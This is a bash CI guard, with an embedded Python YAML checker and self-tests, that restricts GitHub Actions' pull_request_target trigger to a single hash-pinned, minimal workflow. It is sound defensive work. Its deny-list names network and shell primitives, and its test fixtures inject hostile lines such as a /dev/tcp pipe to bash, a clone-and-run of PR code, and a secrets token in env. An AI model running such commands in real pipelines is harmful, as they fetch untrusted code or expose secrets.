#!/usr/bin/env bash
# Confine `pull_request_target` (and the other privileged triggers) -- phase 370 D5.
#
# DESIGN (audit cycle 2): the allowed file is PINNED, not policed.
#   PRIMARY: SHA-256 of promotion-source.yml must equal EXPECTED_SHA256 below. Any byte
#   change fails; changing the file therefore always means a visible two-file diff
#   (the workflow + this pin). SECONDARY (defense in depth, below): parsed-YAML
#   structure checks + raw-line backstops. The pin bypass exists ONLY inside
#   --self-test (shell variable PIN_BYPASS, never read from the environment).
#
# WHY THIS EXISTS
# ---------------
# `pull_request_target` runs the BASE branch's workflow with a privileged
# token and secrets in scope. It is only safe while nothing from the PR is
# ever fetched or executed. So it is allowed in exactly one file,
# .github/workflows/promotion-source.yml, and only while that file:
#   1. triggers ONLY on `pull_request_target`, with an `edited` type,
#   2. is structurally minimal (parsed YAML, not grep): every job has only
#      name / runs-on / timeout-minutes / permissions / steps, and every step
#      only name / env / run -- so no `uses:`, `with:`, `container:`,
#      `services:`, reusable-workflow call or any other way to fetch PR code,
#   3. has `permissions: {}` at workflow level AND on every job; EVERY
#      `permissions:` line in the file is exactly `permissions: {}`,
#   4. allows the expression opener only on three line shapes (env entries
#      `NAME: <expr github.x>`, the templated job name, the concurrency group);
#      any other line -- run bodies of any scalar style, single-line `run:`,
#      comment lines (GitHub interpolates comments inside a run body) -- fails,
#   5. carries the templated job name
#        `    name: Promotion source (<expr github.event.pull_request.base.ref>)`
#      and no looser `Promotion source` form,
#   6. has no network/fetch/exec primitive in any run body: git/gh, curl, wget, nc/ncat,
#      ssh, openssl, docker, npm/npx, pip, pull/ paths, secrets, eval, exec,
#      source / `. file`, bash|sh|zsh <file>, `| sh`, python/perl/ruby/node/php,
#      /dev/tcp|udp, /inet/, command substitution `$(` and backticks.
# Port of the backend's CiInfraCoverageTest assertion.
#
# In ALL workflow files (YAML-aware, so escapes / flow / quoted / string-vs-
# list-vs-map `on:` forms cannot hide a name): `workflow_run`, `issue_comment`,
# `pull_request_review_comment`, `pull_request_review`, `issues`, `discussion`,
# `discussion_comment`, `gollum` are denied, and
# `pull_request_target` is denied outside promotion-source.yml. Any double-
# quoted scalar containing \x, \u, \U or a trailing `\` line-continuation is
# rejected outright (defense in depth), duplicate mapping keys are rejected,
# and unparseable YAML is rejected. PyYAML missing => FAIL CLOSED. Any workflow file
# that is a symlink is rejected (the guard would otherwise read/hash its target).
# No existing mobile workflow legitimately uses a denied trigger (verified
# 2026-10-16), so there is no allow-listed exception.
#
# PyYAML: python3-yaml is not documented in the ubuntu-latest image readme, so
# pr-validate.yml installs it (apt) before this guard when it is missing.
#
# Usage: forbid_pull_request_target_outside_promotion.sh [workflows-dir]
#        forbid_pull_request_target_outside_promotion.sh --self-test

set -euo pipefail

here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
repo_root="$(cd "$here/.." && pwd)"
ALLOWED="promotion-source.yml"
# SHA-256 of .github/workflows/promotion-source.yml. Update in the SAME PR as any edit to it.
EXPECTED_SHA256="581e0d3fd49d7c9241d2bacc4499849c56899556d615a76bd8490765d86cf97c"
# Test-only: honoured solely by self_test (it sets this to 1 around structural cases). Hard-reset
# here so an inherited environment variable of the same name can never switch the pin off.
PIN_BYPASS=0
NAME_VALUE='Promotion source (${{ github.event.pull_request.base.ref }})'
GROUP_VALUE='promotion-source-${{ github.event.pull_request.number }}'
PYTHON="${PYTHON:-python3}"

read -r -d '' PYCHECK <<'PY' || true
import glob, os, re, sys

dir_, allowed, name_value, group_value = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
out = []


def err(f, m):
    out.append("%s: %s" % (f, m))


try:
    import yaml
except Exception as e:  # fail closed
    print("%s: PyYAML unavailable (%s) - failing closed" % (allowed, e))
    sys.exit(2)


class Loader(yaml.SafeLoader):
    pass


def _construct_mapping(loader, node, deep=False):
    loader.flatten_mapping(node)
    seen = set()
    for knode, _ in node.value:
        k = loader.construct_object(knode, deep=True)
        try:
            marker = (type(k).__name__, k)
            hash(marker)
        except TypeError:
            raise yaml.constructor.ConstructorError(None, None, "unhashable mapping key", knode.start_mark)
        if marker in seen:
            raise yaml.constructor.ConstructorError(None, None, "duplicate mapping key %r" % (k,), knode.start_mark)
        seen.add(marker)
    return yaml.SafeLoader.construct_mapping(loader, node, deep)


Loader.add_constructor(yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG, _construct_mapping)

DENIED = {"workflow_run", "issue_comment", "pull_request_review_comment", "pull_request_review",
          "issues", "discussion", "discussion_comment", "gollum"}
PRT = "pull_request_target"

EXPECTED_ENV = {
    "BASE_REF": "${{ github.event.pull_request.base.ref }}",
    "HEAD_REF": "${{ github.event.pull_request.head.ref }}",
    "PR_TITLE": "${{ github.event.pull_request.title }}",
    "HEAD_REPO": "${{ github.event.pull_request.head.repo.full_name }}",
    "BASE_REPO": "${{ github.repository }}",
}
# The ONLY lines allowed to carry the expression opener: the 5 literal env lines, the job name, the group.
ALLOWED_EXPR_LINES = {"          %s: %s" % kv for kv in EXPECTED_ENV.items()}
ALLOWED_EXPR_LINES |= {"    name: " + name_value, "  group: " + group_value}
PERM_KEY = re.compile(r"^\s*[\"']?permissions[\"']?\s*:")
RUN_DENY = [
    r"\bcurl\b", r"\bwget\b", r"\bdocker\b", r"\bnpm\b", r"\bnpx\b", r"\bpip3?\b",
    r"(^|[^\w./-])(git|gh)[ \t]", r"pull/", r"\bsecrets\b", r"\beval\b", r"\bexec\b",
    r"(^|[;&|(])[ \t]*(source|\.)[ \t]+\S", r"\b(bash|sh|zsh)\b[ \t]+\S",
    r"\bpython[0-9.]*\b", r"\bperl\b", r"\bruby\b", r"\bnode\b", r"\bphp\b",
    r"/dev/(tcp|udp)", r"\|[ \t]*(ba|z|da)?sh\b", r"\$\(", r"`",
    r"\bnc\b", r"\bncat\b", r"\bopenssl\b", r"/inet/", r"\bssh",
]


def trigger_set(f, doc):
    """Return (set_of_trigger_names, on_value), or None after recording an error."""
    if not isinstance(doc, dict):
        err(f, "workflow root is not a mapping")
        return None
    keys = [k for k in doc if k is True or k == "on"]  # YAML 1.1: a bare `on` key parses as True
    if len(keys) != 1:
        err(f, "expected exactly one 'on' key, found %d" % len(keys))
        return None
    on = doc[keys[0]]
    if isinstance(on, str):
        return {on.lower()}, on
    if isinstance(on, list):
        return {str(x).lower() for x in on}, on
    if isinstance(on, dict):
        return {str(k).lower() for k in on}, on
    err(f, "'on' is neither string, list nor map")
    return None


def check_file(path):
    f = os.path.basename(path)
    try:
        with open(path, encoding="utf-8") as fh:
            text = fh.read()
    except Exception as e:
        err(f, "unreadable (%s)" % e)
        return None
    try:
        for tok in yaml.scan(text, Loader=Loader):
            if isinstance(tok, yaml.ScalarToken) and tok.style == '"':
                raw = text[tok.start_mark.index:tok.end_mark.index]
                if re.search(r"\\[xuU]|\\[ \t]*\r?\n", raw):
                    err(f, "line %d: double-quoted scalar with \\x/\\u/\\U escape or trailing backslash (can hide a trigger name)" % (tok.start_mark.line + 1))
        docs = list(yaml.load_all(text, Loader=Loader))
    except Exception as e:
        err(f, "unparseable YAML, failing closed (%s)" % str(e).splitlines()[0])
        return None
    if len(docs) != 1 or docs[0] is None:
        err(f, "expected exactly one YAML document")
        return None
    doc = docs[0]
    res = trigger_set(f, doc)
    if res is None:
        return None
    trig, on = res
    for t in sorted(trig & DENIED):
        err(f, "uses privileged trigger '%s' (denied in every workflow)" % t)
    if f != allowed and PRT in trig:
        err(f, "uses pull_request_target (only %s may)" % allowed)
    return text, doc, trig, on


def check_allowed(f, text, doc, trig, on):
    if trig != {PRT}:
        err(f, "'on:' must contain ONLY pull_request_target (found %s)" % sorted(trig))
    cfg = on.get(PRT) if isinstance(on, dict) else None
    if not (isinstance(cfg, dict) and isinstance(cfg.get("types"), list) and "edited" in cfg["types"]):
        err(f, "pull_request_target must declare types including 'edited' (retargets must re-run)")

    extra = set(doc) - {"name", "on", True, "permissions", "concurrency", "jobs"}
    if extra:
        err(f, "unexpected top-level keys %s" % sorted(map(str, extra)))
    if doc.get("permissions", "<missing>") != {}:
        err(f, "workflow-level 'permissions: {}' missing")
    conc = doc.get("concurrency")
    if not (isinstance(conc, dict) and set(conc) <= {"group", "cancel-in-progress"}):
        err(f, "concurrency must be a mapping of group / cancel-in-progress only")
    elif conc.get("group") != group_value:
        err(f, "concurrency.group must be exactly '%s'" % group_value)

    jobs = doc.get("jobs")
    if not isinstance(jobs, dict) or not jobs:
        err(f, "jobs must be a non-empty mapping")
        jobs = {}
    named = False
    for jid, job in jobs.items():
        if not isinstance(job, dict):
            err(f, "job '%s' is not a mapping" % jid)
            continue
        bad = set(job) - {"name", "runs-on", "timeout-minutes", "permissions", "steps"}
        if bad:
            err(f, "job '%s' has forbidden keys %s (only name/runs-on/timeout-minutes/permissions/steps; no uses/with/container/services/needs/env/if)" % (jid, sorted(map(str, bad))))
        if job.get("permissions", "<missing>") != {}:
            err(f, "job '%s': 'permissions' must be exactly {}" % jid)
        if job.get("runs-on") != "ubuntu-latest":
            err(f, "job '%s': runs-on must be exactly 'ubuntu-latest' (no self-hosted runner)" % jid)
        jn = job.get("name")
        if jn == name_value:
            named = True
        else:
            err(f, "job '%s': name must be exactly '%s'" % (jid, name_value))
        steps = job.get("steps")
        if not isinstance(steps, list) or not steps:
            err(f, "job '%s': steps must be a non-empty list" % jid)
            continue
        for i, st in enumerate(steps, 1):
            if not isinstance(st, dict):
                err(f, "job '%s' step %d is not a mapping" % (jid, i))
                continue
            sbad = set(st) - {"name", "env", "run"}
            if sbad:
                err(f, "job '%s' step %d has forbidden keys %s (only name/env/run; PR code must never be fetched)" % (jid, i, sorted(map(str, sbad))))
            run = st.get("run")
            if not isinstance(run, str):
                err(f, "job '%s' step %d has no string 'run'" % (jid, i))
                continue
            if "${{" in run:
                err(f, "job '%s' step %d: run string contains the expression opener (author-controlled values must arrive via env only)" % (jid, i))
            env = st.get("env", {})
            if env != EXPECTED_ENV:
                err(f, "job '%s' step %d: env must equal exactly the 5 expected entries %s" % (jid, i, sorted(EXPECTED_ENV)))
            body = "\n".join(l for l in run.splitlines() if not l.lstrip().startswith("#"))
            for rx in RUN_DENY:
                m = re.search(rx, body, re.M)
                if m:
                    err(f, "job '%s' step %d: run body contains forbidden construct /%s/ near %r" % (jid, i, rx, m.group(0).strip()))
    if not named:
        err(f, "no job with name exactly '%s'" % name_value)

    for n, l in enumerate(text.splitlines(), 1):
        if "${{" in l and l not in ALLOWED_EXPR_LINES:
            err(f, "line %d: expression opener outside the 7 allowed literal lines (comments and every scalar style count): %s" % (n, l.strip()[:90]))
        if PERM_KEY.match(l) and l.strip() != "permissions: {}":
            err(f, "line %d: every permissions: line must be exactly 'permissions: {}': %s" % (n, l.strip()[:60]))


for path in sorted(os.path.join(dir_, n) for n in os.listdir(dir_) if n.lower().endswith((".yml", ".yaml")) and os.path.isfile(os.path.join(dir_, n))):
    r = check_file(path)
    if r is not None and os.path.basename(path) == allowed:
        check_allowed(allowed, *r)
if not os.path.isfile(os.path.join(dir_, allowed)):
    err(allowed, "missing (the guard workflow must exist)")

if out:
    print("\n".join(out))
    sys.exit(1)
PY

# code_lines <file>: non-comment lines.
code_lines() { grep -a -v -E '^[[:space:]]*#' "$1" || true; }

# scan <workflows-dir>: print violations; return 1 if any.
scan() {
  local dir="$1" f base out="" py rc
  local -a files=()
  while IFS= read -r f; do files+=("$f"); done < <(find "$dir" -maxdepth 1 -type f \( -iname '*.yml' -o -iname '*.yaml' \) | sort)

  # Symlinks: find -type f skips them and the YAML pass would follow them, so reject outright.
  while IFS= read -r f; do
    out+="$(basename "$f"): is a symlink (workflow files must be regular files)"$'\n'
  done < <(find "$dir" -maxdepth 1 -type l \( -iname '*.yml' -o -iname '*.yaml' \) | sort)

  # Raw-text backstop (the YAML pass below is the real check).
  for f in "${files[@]}"; do
    base="$(basename "$f")"
    if [ "$base" != "$ALLOWED" ] && code_lines "$f" | grep -a -q -E '(^|[^A-Za-z0-9_])pull_request_target([^A-Za-z0-9_]|$)'; then
      out+="$base: uses pull_request_target (only $ALLOWED may)"$'\n'
    fi
  done

  # Primary check: the pin. Skipped only when self_test set PIN_BYPASS=1.
  if [ "$PIN_BYPASS" != "1" ] && [ -f "$dir/$ALLOWED" ]; then
    local actual; actual="$(sha256sum "$dir/$ALLOWED" | cut -d' ' -f1)"
    if [ "$actual" != "$EXPECTED_SHA256" ]; then
      out+="$ALLOWED: $ALLOWED changed; review it and update the pinned hash in scripts/$(basename "${BASH_SOURCE[0]}") in the same PR (expected $EXPECTED_SHA256, got $actual)"$'\n'
    fi
  fi

  set +e
  py="$("$PYTHON" -I -c "$PYCHECK" "$dir" "$ALLOWED" "$NAME_VALUE" "$GROUP_VALUE" 2>&1)"; rc=$?
  set -e
  if [ "$rc" -ne 0 ]; then
    [ -n "$py" ] || py="$ALLOWED: YAML checker failed to run (rc=$rc, python='$PYTHON') - failing closed"
    out+="$py"$'\n'
  fi

  if [ -n "$out" ]; then printf '%s' "$out"; return 1; fi
  return 0
}

self_test() {
  local tmp rc=0 src="$repo_root/.github/workflows/$ALLOWED"
  tmp="$(mktemp -d)"; trap 'rm -rf "$tmp"' RETURN
  [ -f "$src" ] || { echo "  FAIL  $ALLOWED missing"; return 1; }

  mk() { # name -> fresh dir with a clean copy of the guard + one other workflow
    mkdir -p "$tmp/$1"; cp "$src" "$tmp/$1/$ALLOWED"
    printf 'on:\n  pull_request:\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n' >"$tmp/$1/other.yml"
  }
  # run_case name want-rc [reason-substring]: structural checks only (PIN_BYPASS=1, self-test scope), so a
  # mutated promotion-source.yml is judged on ITS OWN reason, not on the hash. With a 3rd arg, the output
  # must also contain that substring (the specific reason). run_pinned: same but with the pin enforced.
  _run() { # bypass name want needle
    local st o; PIN_BYPASS="$1"; set +e; o="$(scan "$tmp/$2" 2>&1)"; st=$?; set -e; PIN_BYPASS=0
    if [ "$st" -ne "$3" ]; then printf '  FAIL  %s (want rc=%s got rc=%s)\n' "$2" "$3" "$st"; rc=1
    elif [ -n "${4:-}" ] && ! printf '%s' "$o" | grep -a -q -F -- "$4"; then printf '  FAIL  %s (rc ok, reason %q missing; got: %s)\n' "$2" "$4" "$(printf '%s' "$o" | head -c 200)"; rc=1
    else printf '  PASS  %s\n' "$2"; fi
  }
  run_case() { _run 1 "$1" "$2" "${3:-}"; }
  run_pinned() { _run 0 "$1" "$2" "${3:-}"; }
  other() { # name <stdin>: replace other.yml body
    mk "$1"; cat >"$tmp/$1/other.yml"
  }
  edit() { # name sed-expr: edit the guard copy
    sed -i "$2" "$tmp/$1/$ALLOWED"
  }
  local SET='s/^          set -euo pipefail$/          set -euo pipefail\n'
  echo "forbid_pull_request_target_outside_promotion --self-test"
  mk clean;            run_pinned clean 0
  mk clean_structural; run_case clean_structural 0   # the structural checks alone also accept the pinned file

  # --- original cases
  mk other_uses_prt;   printf '  # comment ok\non:\n  pull_request_target:\n' >>"$tmp/other_uses_prt/other.yml"; run_case other_uses_prt 1
  mk other_comment_only; printf '# pull_request_target in a comment\n' >>"$tmp/other_comment_only/other.yml"; run_case other_comment_only 0
  mk no_edited;        edit no_edited 's/\[opened, edited, /[opened, /'; run_case no_edited 1
  mk has_checkout;     edit has_checkout 's/^    steps:/    steps:\n      - uses: actions\/checkout@v4/'; run_case has_checkout 1
  mk no_wf_perms;      edit no_wf_perms '0,/^permissions: {}$/s//permissions: read-all/'; run_case no_wf_perms 1
  mk no_job_perms;     edit no_job_perms 's/^    permissions: {}$/    permissions: read-all/'; run_case no_job_perms 1
  mk expr_in_run;      edit expr_in_run "$SET"'          echo "${{ github.event.pull_request.title }}"/'; run_case expr_in_run 1
  mk loose_name;       edit loose_name 's/^    name: Promotion source (.*$/    name: Promotion source/'; run_case loose_name 1
  mkdir -p "$tmp/missing"; printf 'on: push\n' >"$tmp/missing/other.yml"; run_case missing 1

  # --- [MEDIUM 1] trigger name hidden from grep (auditor cases: esc, uni, cont, quoted, flow, yaml)
  other esc_hex <<'EOF'
on:
  "pull_request_\x74arget":
EOF
  run_case esc_hex 1
  other esc_unicode <<'EOF'
on:
  "pull\u005Frequest_target":
EOF
  run_case esc_unicode 1
  other esc_continuation <<'EOF'
on: ["pull_request_\
  target"]
EOF
  run_case esc_continuation 1
  other double_quoted_plain_key <<'EOF'
on:
  "pull_request_target":
EOF
  run_case double_quoted_plain_key 1
  other single_quoted_key <<'EOF'
on:
  'pull_request_target':
EOF
  run_case single_quoted_key 1
  other flow_list <<'EOF'
on: [pull_request_target]
jobs: {}
EOF
  run_case flow_list 1
  other on_string <<'EOF'
on: pull_request_target
EOF
  run_case on_string 1
  mk on_string_yaml_ext; printf 'on: pull_request_target\n' >"$tmp/on_string_yaml_ext/x.yaml"; run_case on_string_yaml_ext 1
  other quoted_on_key <<'EOF'
"on": [pull_request_target]
EOF
  run_case quoted_on_key 1
  other on_two_keys <<'EOF'
"on": push
on: [pull_request_target]
EOF
  run_case on_two_keys 1
  other dup_key <<'EOF'
on:
  push:
  push:
EOF
  run_case dup_key 1
  other unparseable <<'EOF'
on: [push
  : : :
EOF
  run_case unparseable 1
  other benign_escape_still_rejected <<'EOF'
on: push
env:
  X: "tab\u0009here"
EOF
  run_case benign_escape_still_rejected 1
  other on_list_benign <<'EOF'
on: [push, pull_request]
EOF
  run_case on_list_benign 0
  mk prt_not_only_trigger; sed -i 's/^on:$/on:\n  push:/' "$tmp/prt_not_only_trigger/$ALLOWED"; run_case prt_not_only_trigger 1
  mk no_python
  if ( PYTHON=/nonexistent/python3; scan "$tmp/no_python" >/dev/null 2>&1 ); then echo "  FAIL  no_python (failed OPEN)"; rc=1; else echo "  PASS  no_python (fails closed)"; fi

  # --- [LOW] other privileged triggers (auditor case: wfrun) in ANY workflow
  other workflow_run <<'EOF'
on:
  workflow_run:
    workflows: [x]
EOF
  run_case workflow_run 1
  other workflow_run_list <<'EOF'
on: [push, workflow_run]
EOF
  run_case workflow_run_list 1
  other issue_comment <<'EOF'
on:
  issue_comment:
    types: [created]
EOF
  run_case issue_comment 1
  other pr_review_comment <<'EOF'
on: pull_request_review_comment
EOF
  run_case pr_review_comment 1
  other pr_review <<'EOF'
on: [pull_request_review]
EOF
  run_case pr_review 1
  mk guard_has_workflow_run; sed -i 's/^on:$/on:\n  workflow_run:\n    workflows: [x]/' "$tmp/guard_has_workflow_run/$ALLOWED"; run_case guard_has_workflow_run 1

  # --- [MEDIUM 2] expression opener outside the 3 allowed line shapes (auditor cases: fold, strip, single, cmt)
  mk expr_folded;      edit expr_folded 's/^        run: |$/        run: >/;'"$SET"'          echo "${{ github.event.pull_request.title }}"/'; run_case expr_folded 1
  mk expr_strip;       edit expr_strip 's/^        run: |$/        run: |-/;'"$SET"'          echo "${{ github.event.pull_request.title }}"/'; run_case expr_strip 1
  mk expr_single_line; edit expr_single_line 's/^    steps:$/    steps:\n      - run: echo "${{ github.event.pull_request.title }}"/'; run_case expr_single_line 1
  mk expr_in_comment_in_run; edit expr_in_comment_in_run "$SET"'          # ${{ github.event.pull_request.body }}/'; run_case expr_in_comment_in_run 1
  mk expr_in_header_comment; edit expr_in_header_comment '1s/^/# ${{ github.event.pull_request.title }}\n/'; run_case expr_in_header_comment 1
  mk expr_env_nongithub; edit expr_env_nongithub 's/^          BASE_REPO: .*$/          BASE_REPO: ${{ env.X }}/'; run_case expr_env_nongithub 1
  mk expr_env_lowercase; edit expr_env_lowercase 's/^          BASE_REPO: .*$/          base_repo: ${{ github.repository }}/'; run_case expr_env_lowercase 1

  # --- [MEDIUM 3] permissions: every line exactly `permissions: {}`, workflow + every job (auditor case: job2)
  mk perms_write_all_line; edit perms_write_all_line 's/^    timeout-minutes: 5$/    timeout-minutes: 5\n    permissions: write-all/'; run_case perms_write_all_line 1
  mk perms_job_map;    edit perms_job_map 's/^    permissions: {}$/    permissions:\n      contents: read/'; run_case perms_job_map 1
  mk perms_job_missing; edit perms_job_missing '/^    permissions: {}$/d'; run_case perms_job_missing 1
  mk perms_wf_missing; edit perms_wf_missing '0,/^permissions: {}$/{/^permissions: {}$/d}'; run_case perms_wf_missing 1
  mk perms_quoted_key; edit perms_quoted_key 's/^    permissions: {}$/    "permissions": read-all/'; run_case perms_quoted_key 1
  mk perms_second_job; cat >>"$tmp/perms_second_job/$ALLOWED" <<'EOF'
  second:
    runs-on: ubuntu-latest
    permissions: write-all
    steps:
      - run: echo hi
EOF
  run_case perms_second_job 1
  mk perms_second_job_none; cat >>"$tmp/perms_second_job_none/$ALLOWED" <<'EOF'
  second:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
EOF
  run_case perms_second_job_none 1

  # --- [MEDIUM 4] no way to fetch / run PR code: structure + run-body deny-list (auditor cases: fetch, secret)
  mk run_git_clone;    edit run_git_clone "$SET"'          git clone "https:\/\/github.com\/$HEAD_REPO" x \&\& bash x\/run.sh/'; run_case run_git_clone 1
  mk run_curl;         edit run_curl "$SET"'          curl -s "$HEAD_REPO"/'; run_case run_curl 1
  mk run_wget;         edit run_wget "$SET"'          wget "$HEAD_REPO"/'; run_case run_wget 1
  mk run_gh;           edit run_gh "$SET"'          gh pr checkout 1/'; run_case run_gh 1
  mk run_docker;       edit run_docker "$SET"'          docker run x/'; run_case run_docker 1
  mk run_npm;          edit run_npm "$SET"'          npm ci/'; run_case run_npm 1
  mk run_pip;          edit run_pip "$SET"'          pip install x/'; run_case run_pip 1
  mk run_source;       edit run_source "$SET"'          source .\/x.sh/'; run_case run_source 1
  mk run_bash_file;    edit run_bash_file "$SET"'          bash x.sh/'; run_case run_bash_file 1
  mk run_pull_path;    edit run_pull_path "$SET"'          echo refs\/pull\/1\/head/'; run_case run_pull_path 1
  mk run_secrets_env;  edit run_secrets_env 's/^          BASE_REPO: .*$/          BASE_REPO: ${{ github.repository }}\n          TOK: ${{ secrets.BEAUTICA_KEYSTORE_PASSWORD }}/'; run_case run_secrets_env 1
  mk step_uses;        edit step_uses 's/^      - name: Check PR source.*$/      - uses: actions\/cache@v4\n        with:\n          path: x\n      - name: Check PR source branch against target branch/'; run_case step_uses 1
  mk step_with_only;   edit step_with_only 's/^        env:$/        with:\n          a: b\n        env:/'; run_case step_with_only 1
  mk step_shell_key;   edit step_shell_key 's/^        env:$/        shell: bash\n        env:/'; run_case step_shell_key 1
  mk job_container;    edit job_container 's/^    timeout-minutes: 5$/    timeout-minutes: 5\n    container: ubuntu/'; run_case job_container 1
  mk job_services;     edit job_services 's/^    timeout-minutes: 5$/    timeout-minutes: 5\n    services: {}/'; run_case job_services 1
  mk job_uses_reusable; edit job_uses_reusable 's/^    timeout-minutes: 5$/    timeout-minutes: 5\n    uses: .\/.github\/workflows\/x.yml/'; run_case job_uses_reusable 1

  # --- audit cycle 2: pin + tightened structural checks + new bypass cases
  mk hash_mismatch;    printf '\n' >>"$tmp/hash_mismatch/$ALLOWED"; run_pinned hash_mismatch 1 "changed; review it and update the pinned hash"
  mk hash_mismatch_byte; edit hash_mismatch_byte 's/timeout-minutes: 5/timeout-minutes: 6/'; run_pinned hash_mismatch_byte 1 "update the pinned hash"
  mk pin_bypass_not_env; edit pin_bypass_not_env 's/timeout-minutes: 5/timeout-minutes: 6/'
  if PIN_BYPASS=1 bash "${BASH_SOURCE[0]}" "$tmp/pin_bypass_not_env" >/dev/null 2>&1; then echo "  FAIL  pin_bypass_not_env (env var switched the pin off)"; rc=1; else echo "  PASS  pin_bypass_not_env"; fi

  mk envshape_in_run;  edit envshape_in_run "$SET"'          FOO: ${{ github.event.pull_request.title }}/'; run_case envshape_in_run 1 "run string contains the expression opener"
  mk py_fetch;         edit py_fetch "$SET"'          python3 -c "import urllib.request as u"; python3 \/tmp\/x/'; run_case py_fetch 1 "python"
  mk perl_fetch;       edit perl_fetch "$SET"'          perl -MLWP::Simple -e 1; perl \/tmp\/a/'; run_case perl_fetch 1 "perl"
  mk devtcp;           edit devtcp "$SET"'          cat <\/dev\/tcp\/1.2.3.4\/80 | bash/'; run_case devtcp 1 "/dev/(tcp|udp)"
  mk cmdsub_curl;      edit cmdsub_curl "$SET"'          c=cu; $(echo ${c}rl) -s https:\/\/e.x/'; run_case cmdsub_curl 1 'forbidden construct'
  mk cmdsub_only;      edit cmdsub_only "$SET"'          x=$(date)/'; run_case cmdsub_only 1 '$('
  mk backtick;         edit backtick "$SET"'          x=`date`/'; run_case backtick 1 'forbidden construct'
  mk pipe_sh;          edit pipe_sh "$SET"'          printf x | sh/'; run_case pipe_sh 1 'forbidden construct'
  mk run_ruby;         edit run_ruby "$SET"'          ruby -e 1/'; run_case run_ruby 1 "ruby"
  mk run_node;         edit run_node "$SET"'          node -e 1/'; run_case run_node 1 "node"
  mk run_php;          edit run_php "$SET"'          php -r 1/'; run_case run_php 1 "php"
  mk self_hosted;      edit self_hosted 's/^    runs-on: ubuntu-latest$/    runs-on: self-hosted/'; run_case self_hosted 1 "runs-on must be exactly 'ubuntu-latest'"
  mk github_token_env; edit github_token_env 's/^          BASE_REPO: .*$/&\n          T: ${{ github.token }}/'; run_case github_token_env 1 "env must equal exactly"
  mk env_value_swapped; edit env_value_swapped 's/^          BASE_REPO: .*$/          BASE_REPO: ${{ github.token }}/'; run_case env_value_swapped 1 "env must equal exactly"
  mk env_literal_added; edit env_literal_added 's/^          BASE_REPO: .*$/&\n          X: literal/'; run_case env_literal_added 1 "env must equal exactly"
  mk name_wrong;       edit name_wrong 's/^    name: Promotion source (.*$/    name: Promotion source (${{ github.event.pull_request.head.ref }})/'; run_case name_wrong 1 "name must be exactly"
  mk group_wrong;      edit group_wrong 's/^  group: .*$/  group: promotion-source-${{ github.event.pull_request.title }}/'; run_case group_wrong 1 "concurrency.group must be exactly"
  mk group_missing;    edit group_missing '/^concurrency:$/,/^  cancel-in-progress: true$/d'; run_case group_missing 1 "concurrency must be a mapping"
  mk upper_yml;        printf 'on: pull_request_target\n' >"$tmp/upper_yml/x.YML"; run_case upper_yml 1 "x.YML"
  mk upper_yaml_mixed; printf 'on: [pull_request_target]\n' >"$tmp/upper_yaml_mixed/y.Yaml"; run_case upper_yaml_mixed 1 "y.Yaml"

  # --- final fixes: more privileged triggers, more run-body primitives, symlinks
  other issues <<'EOF2'
on:
  issues:
    types: [opened]
EOF2
  run_case issues 1 "privileged trigger"
  other discussion <<'EOF2'
on: discussion
EOF2
  run_case discussion 1 "privileged trigger"
  other discussion_comment <<'EOF2'
on: [discussion_comment]
EOF2
  run_case discussion_comment 1 "privileged trigger"
  other gollum <<'EOF2'
on: gollum
EOF2
  run_case gollum 1 "privileged trigger"
  mk run_nc;           edit run_nc "$SET"'          nc 1.2.3.4 80/'; run_case run_nc 1 "nc"
  mk run_ncat;         edit run_ncat "$SET"'          ncat 1.2.3.4 80/'; run_case run_ncat 1 "ncat"
  mk run_openssl;      edit run_openssl "$SET"'          openssl s_client -connect 1.2.3.4:443/'; run_case run_openssl 1 "openssl"
  mk run_inet;         edit run_inet "$SET"'          awk 1 \/inet\/tcp\/0\/1.2.3.4\/80/'; run_case run_inet 1 "/inet/"
  mk run_ssh;          edit run_ssh "$SET"'          ssh root@1.2.3.4/'; run_case run_ssh 1 "ssh"
  mk symlink_other;    rm "$tmp/symlink_other/other.yml"; printf 'on: push\n' >"$tmp/symlink_other/real.txt"; ln -s real.txt "$tmp/symlink_other/other.yml"; run_case symlink_other 1 "is a symlink"
  mk symlink_guard;    mv "$tmp/symlink_guard/$ALLOWED" "$tmp/symlink_guard/real.txt"; ln -s real.txt "$tmp/symlink_guard/$ALLOWED"; run_case symlink_guard 1 "is a symlink"
  return $rc
}

if [ "${1:-}" = "--self-test" ]; then
  if self_test; then echo "SELF-TEST OK: forbid_pull_request_target_outside_promotion.sh"; exit 0; fi
  exit 1
fi

dir="${1:-$repo_root/.github/workflows}"
set +e; offenders="$(scan "$dir")"; status=$?; set -e
if [ "$status" -ne 0 ]; then
  echo "ERROR: pull_request_target is not confined to a hardened promotion-source.yml (phase 370 D5)."
  echo
  printf '%s\n' "$offenders" | sed 's/^/  /'
  echo
  echo "pull_request_target runs privileged from the base branch: no checkout/uses, permissions: {}, env-only inputs."
  exit 1
fi
echo "forbid_pull_request_target_outside_promotion: OK — pull_request_target confined to $ALLOWED."
